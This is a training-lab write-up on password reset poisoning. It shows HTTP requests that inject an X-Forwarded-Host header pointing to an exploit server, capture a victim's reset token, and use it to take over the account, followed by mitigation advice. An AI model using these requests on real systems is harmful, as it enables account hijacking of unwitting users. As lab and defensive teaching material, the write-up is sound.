# Lab 8: Password reset poisoning

## Vulnerability Type
  - Authentication Flaw
  - Password reset poisoning
  - Header manipulation / Host header injection

### OWASP Top 10 Mapping
  - A01:2021 – Broken Access Control (attacker resets password of another user).
  - A05:2021 – Security Misconfiguration (trusting unvalidated headers like X-Forwarded-Host).
  - A07: 2021 – Identification and Authentication Failures

---

## Description

The application’s password reset functionality is vulnerable because it trusts unvalidated user-controlled headers (`X-Forwarded-Host`) when generating password reset links. An attacker can poison the password reset email by injecting a malicious domain into these headers.  

When the victim requests a password reset, the application sends a reset link that includes the attacker’s domain instead of the legitimate one. If the victim clicks the poisoned link, the reset token is leaked to the attacker-controlled server. With this token, the attacker can reset the victim’s password and gain full access to their account.  

This vulnerability arises from **improper validation of input headers** and **insecure password reset logic**, allowing attackers to hijack accounts through social engineering and header injection.  

---

## Tools Used
- **Burp Suite** (Proxy, Intruder, Grep Match/Extract)

---

## Step-by-Step Exploitation

1. **Recon the reset flow**
   - Browse to **Forgot password** and trigger a reset for **your own account**.
   - Intercept **POST /forgot-password** in Burp.
   - Note how the app builds the reset link in the email (usually from `Host` or proxy headers like `X-Forwarded-Host`).

2. **Poison the reset link origin**
   - In the intercepted request, add a header pointing to your exploit server:
     ```http
     X-Forwarded-Host: <your-exploit-host>.exploit-server.net
     ```
   - If unsupported, try `Host` injection or add scheme/port with:
     ```
     X-Forwarded-Proto: https
     X-Forwarded-Port: 443
     ```
   - Forward the request and confirm the reset link points to **your exploit domain**.

3. **Validate the behavior with your account**
   - Click the poisoned link for your account.
   - On your exploit server, verify the inbound request contains the **reset token**:
     ```
     GET /?temp-forgot-password-token=eyJ... HTTP/1.1
     ```
   - This proves the app is trusting your injected header.

4. **Target the victim**
   - Repeat **POST /forgot-password**, but use the victim’s username/email:
     ```http
     POST /forgot-password HTTP/1.1
     Host: target.site
     X-Forwarded-Host: <your-exploit-host>.exploit-server.net
     Content-Type: application/x-www-form-urlencoded

     username=carlos
     ```
   - Send the request.  
   - The victim will receive a poisoned link pointing to **your exploit host**.

5. **Capture the victim’s token**
   - Wait for the victim to click the email link.
   - On your exploit server, capture the **token** from the incoming request.
     - Example:
       ```
       GET /?temp-forgot-password-token=eyJ... HTTP/1.1
       Host: <your-exploit-host>.exploit-server.net
       ```

6. **Redeem the token (single use!)**
   - Immediately use the token to set a new password for the victim:
     ```http
     POST /forgot-password?temp-forgot-password-token=<captured_token> HTTP/1.1
     Host: target.site
     Content-Type: application/x-www-form-urlencoded

     username=carlos&new-password=NewStrongP@ssw0rd
     ```
   - If you get **400 Invalid token**, it has already been used or expired.  
     → Capture a **fresh token** and redeem quickly.

7. **Log in as the victim**
   - Use the victim’s username and the password you set:
     ```
     carlos : NewStrongP@ssw0rd
     ```
   - Confirm access to the victim’s account.

---

### ⚡ Tips
  - **Tokens are one-time use** → redeem quickly after capture.
  - Some apps ignore `X-Forwarded-Host` unless behind a proxy → try `Host` header poisoning instead.
  - Use **Burp Repeater** templates for fast token redemption.

---

## Mitigation

1. **Strict Host Validation**
   - Do not trust user-supplied headers (`Host`, `X-Forwarded-Host`, `X-Forwarded-Proto`, etc.).
   - Define a **static, server-side base URL** for generating password reset links.

2. **Remove Dangerous Headers**
   - Strip or ignore forwarding headers unless absolutely required.
   - If using a reverse proxy, configure it to **overwrite headers with safe values**.

3. **Token Security**
   - Ensure reset tokens are:
     - **Strongly random** (cryptographically secure).
     - **Bound to a user and an IP/session**.
     - **Single-use and short-lived** (expire in minutes).
   - Store tokens **hashed in the database**, not plaintext.

4. **Email Security**
   - Embed only the **reset token**, not user credentials or sensitive data.
   - Avoid reflecting attacker-controlled input in the reset email.

5. **Rate Limiting & Monitoring**
   - Add rate limits on password reset requests.
   - Monitor suspicious headers and repeated reset requests for anomalies.

6. **Testing & Hardening**
   - Conduct security tests for **header injection and host header poisoning**.
   - Use a **web application firewall (WAF)** to block malformed header attacks.
  

---

## Real-World Relevance

 - **Password reset poisoning** has been observed in real-world attacks where misconfigured password reset mechanisms allow attackers to redirect reset links to domains under their control.  
 - Affected systems include **large-scale web applications, SaaS platforms, and financial services** where password resets rely on user-controlled headers such as `Host` or `X-Forwarded-Host`.  
 - Attackers can exploit this to **harvest password reset tokens** and take over user accounts.  
 - A real incident occurred when attackers abused **misconfigured reverse proxies** to capture reset tokens of enterprise accounts.  
 - In penetration testing and bug bounty programs, this vulnerability is often reported under **"Password Reset Poisoning / Host Header Injection"** findings.
